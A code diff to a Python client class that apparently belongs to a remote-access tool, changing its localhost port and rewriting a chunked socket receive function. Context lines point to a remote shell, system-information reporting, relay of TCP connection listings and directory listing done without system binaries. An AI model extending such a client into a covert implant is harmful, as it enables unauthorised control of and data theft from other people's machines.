@@ -24,7 +24,7 @@ from time import sleep
 from datetime import datetime
 
 
-address = "127.0.0.1", 11000
+address = "127.0.0.1", 1100
 
 class Client:
     """Class handles all client side funtionality"""
@@ -148,23 +148,27 @@ class Client:
         return
     
 
-    def receive_data(conn):
-        received_data = b''
+    def receive_data(self, recvsocket):
+        """function that recieves data
+        first the header is recieved with the chunk size and total length
+        after this it recieves data in the chunk size until the last packet where it is the remaining length"""
         try:
-            total_length, chunk_size = struct.unpack('!II', conn.recv(8))
-            print("Header received - Total length:", total_length, "Chunk size:", chunk_size)
-            while total_length > 0:
-                chunk = conn.recv(min(chunk_size, total_length))
-                received_data += chunk
-                total_length -= len(chunk)
+            total_length, chunk_size = struct.unpack('!II',recvsocket.recv(8)) #unpacks the header length
+            received_data = b'' # sets receveid bytes to a bytes string
+            while total_length > 0: # loop until total_length is less than 0 
+                chunk = recvsocket.recv(min(chunk_size, total_length)) # receives chunk based off whatever is smaller, total length or chunk_size
+                received_data += chunk # adds the chunk to recieved data
+                total_length -= len(chunk) # removes the chunk length from the total_length
             try:
-                received_data = received_data.decode("utf-8")
+                received_data = received_data.decode("utf-8") # attempts to decode the data
             except UnicodeDecodeError:
-                pass
-            print("Received data:", received_data)
+                pass # else doesnt decode the data and returns it as bytes
         except struct.error:
             pass
-        return received_data
+        try:
+            return received_data
+        except UnboundLocalError:
+            return
 
 
     def shell(self):
@@ -436,7 +440,6 @@ processor = {platform.processor()}"""))
         for line in lines[1:]:
             self.send_data(ssl_sock, f"{str(self.parse_tcp_line(line))}\n") # parses the data to make it in a readable format then sends it line by line
         self.send_data(ssl_sock, "break") # sends the break to signify last line
-
 
     def list_dir(self):
         """list directorys without using on system binaries in the style of ls -al"""
